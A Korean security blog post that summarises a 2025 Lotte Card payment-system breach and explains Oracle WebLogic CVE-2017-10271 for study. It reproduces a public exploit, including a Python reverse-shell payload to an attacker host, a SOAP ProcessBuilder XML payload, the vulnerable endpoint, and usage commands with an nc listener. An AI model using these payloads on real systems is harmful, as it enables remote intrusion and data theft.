---
title:  "2025-08-26 롯데카드 온라인 결제 시스템 해킹 사건 분석"
excerpt: "오라클 웹로직 CVE-2017-10271 취약점에 대해 알아보자. "

categories: [information, cve]
tags:
  - [cve, oracle ]

typora-root-url: ../../
 
date: 2025-09-02
last_modified_at: 2025-09-02
---
# 사건 개요
<img src="../../../images/2025-09-01-lottecard/image.png" alt="img" style="zoom:50%;" />

롯데카드 온라인 결제 시스템 해킹 시도 포착…웹쉘 업로드 통한 내부자료 1.7GB 유출 정황

롯데카드 내부 서버 해킹 시도가 실제 데이터 유출로 이어진 정황이 확인됐다. 이번 공격은 단순한 침투 시도를 넘어, 온라인 결제 시스템을 겨냥해 악성코드를 심고 내부 자료를 탈취하는 수준으로 진행된 것으로 알려졌다.

롯데카드는 지난 8월 26일 내부 서버 침해 정황을 포착한 뒤 9월 1일 금융감독원에 관련 사실을 신고했다. 자체 조사 결과, 공격자는 Oracle WebLogic(오라클 웹로직)의 CVE-2017-10271 취약점을 악용해 악성코드를 감염시킨 뒤 웹쉘을 업로드했다. 이를 통해 내부 결제 시스템 자료 약 1.7GB가 외부로 유출된 것으로 파악됐다.

롯데카드는 이번 사고가 랜섬웨어와 같은 직접적 서비스 마비 공격은 아니지만, 온라인 결제 핵심 시스템을 노린 침해였다는 점에서 사안의 심각성이 크다고 보고 있다.

**ISMS-P 획득 이후 발생한 보안 침해 사고**

롯데카드는 지난 8월 12일 정보보호 및 개인정보보호 관리체계(ISMS-P) 인증을 획득하며 보안 강화 노력을 이어온 기업이다. 그러나 불과 2주 만에 온라인 결제 시스템에서 취약점이 악용된 사건이 발생하면서 업계 전반의 보안 체계가 여전히 근본적인 위협에 직면해 있음을 보여준다.

출처 : 데일리시큐(https://www.dailysecu.com)

# CVE-2017-10271
## 취약점 개요
CVE-2017-10271은 Oracle WebLogic Server의 원격 코드 실행(RCE) 취약점으로, 공격자가 특수 제작된 XML 데이터를 전송하여 원격에서 임의의 코드를 실행할 수 있는 심각한 보안 문제이다.

해당 취약점은 WebLogic의 wls-wsat 컴포넌트에 존재하는 역직렬화 취약점으로써, 적절한 인증 없이 원격에서 공격이 가능하다. 공격자는 이를 이용해 웹쉘 업로드, 악성코드 설치, 원격 제어 등 다양한 공격을 수행할 수 있다.

## CVE-2017-10271 exploit 방법
- 공격자는 취약한 WebLogic 서버에 악성 XML 페이로드를 보내 원격 코드 실행 권한 획득
- 이후 PowerShell 스크립트 등을 이용해 공격용 바이너리를 다운로드 및 실행하거나 웹쉘을 업로드
- 공개된 익스플로잇 코드와 Metasploit 모듈이 존재하여 실습 환경에서 원격 코드 실행을 연습 가능


### exploit 소스코드 분석
활용 exploit - [Exploit-DB](https://www.exploit-db.com/exploits/43458)

#### 1. 초기화 및 페이로드 생성
```python
def __init__(self, check, rhost, lhost, lport, windows):
    self.url = rhost if not rhost.endswith('/') else rhost.strip('/')
    self.lhost = lhost
    self.lport = lport
    self.check = check
    if windows:
        self.target = 'win'
    else:
        self.target = 'unix'

    if self.target == 'unix':
        self.cmd_payload = (
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."
            "SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2("
            "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ).format(lhost=self.lhost, lport=self.lport)
    else:
        self.cmd_payload = (
            r"powershell -w hidden -nop -c function RSC{...}"
            # Windows reverse shell PowerShell 명령 (생략)
        )
    self.cmd_payload = escape(self.cmd_payload)
```
- 공격자가 리스너 호스트(lhost)와 포트(lport)를 입력 받으며 타겟 OS에 맞춰 리버스 쉘 명령을 생성한다.
- 리눅스/유닉스는 Python 쉘, 윈도우는 PowerShell을 사용하고, 생성된 명령은 XML 인젝션 방지를 위해 escape 처리된다.


#### 2. 공격 명령 실행 페이로드(get_process_builder_payload)
```python
def get_process_builder_payload(self):
    process_builder_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>{cmd_base}</string>
            </void>
            <void index="1">
              <string>{cmd_opt}</string>
            </void>
            <void index="2">
              <string>{cmd_payload}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''
    return process_builder_payload.format(cmd_base=self.cmd_base(), cmd_opt=self.cmd_opt(),
                                  cmd_payload=self.cmd_payload)
```
- Java의 ProcessBuilder 객체를 이용해 셸 명령을 실행하는 SOAP XML 페이로드를 만든다.
- 명령은 리버스 쉘 페이로드가 삽입되어 서버에서 실행된다.


#### 3. payload 전송 및 실행 (post_exploit)
```python
def post_exploit(self, data):
    headers = {
        "Content-Type":
        "text/xml;charset=UTF-8",
        "User-Agent":
        "Mozilla/5.0 ..."
    }
    payload = "/wls-wsat/CoordinatorPortType"

    vulnurl = self.url + payload
    try:
        req = post(
            vulnurl, data=data, headers=headers, timeout=10, verify=False)
        if self.check:
            print("[*] Did you get an HTTP GET request back?")
        else:
            print("[*] Did you get a shell back?")
    except Exception as e:
        print('[!] Connection Error')
        print(e)
```
- 취약한 WebLogic 서버의 wls-wsat 서비스 엔드포인트에 SOAP 페이로드를 POST 방식으로 전송한다.
- check 모드일 때는 HTTP GET 요청 발생 유무를 확인, 아니면 쉘 획득 여부를 확인한다.

### exploit 준비 사항 및 사용 방법
활용 exploit - [Exploit-DB](https://www.exploit-db.com/exploits/43458)

- 취약한 Oracle WebLogic 서버 주소(URL)
- 공격자의 리버스 셸을 받을 IP(lhost) 및 포트(lport) (리스닝 환경 구성 필요)
- Python 3 환경 (requests 라이브러리 필요)
- 리버스 셸 리스닝 도구 (nc 또는 Python HTTP 서버 등)

#### 1. 취약한 서버가 있는 URL, 리버스 쉘을 받을 IP, Port 지정
```bash
python exploit.py -l <공격자_IP> -p <포트> -r http://<취약서버_IP>:7001/
```

#### 2. 윈도우 서버 대상이면 `-w` 옵션 추가하여 윈도우용 페이로드 사용
```bash
python exploit.py -l <공격자_IP> -p <포트> -r http://<취약서버_IP>:7001/ -w
```

#### 3. 취약 여부만 확인하려면 `-c` 옵션을 사용하여 HTTP 요청 체크 실행
```bash
python exploit.py -l <공격자_IP> -p <포트> -r http://<취약서버_IP>:7001/ -c
```

#### 4. 이후 공격자 머신에서 리버스 쉘을 받을 리스너 실행
```bash
nc -nlvp <포트>

또는

python3 -m http.server <포트>
```
스크립트를 실행하면 취약 서버에 XML 페이로드를 전송하여 임의 코드(리버스 셸) 실행을 시도한다. 리스너에서 쉘 접속이 열리면 공격 성공

#### 주요 옵션
- `-l` : 리스너 IP
- `-p` : 리스너 포트
- `-r` : 취약 서버 URL (예: http://10.10.10.10:7001)
- `-c` : 취약점 존재 체크(HTTP 요청만 확인)
- `-w` : 윈도우 대상 페이로드 사용

주의: 반드시 허가된 실습 환경에서만 사용!!

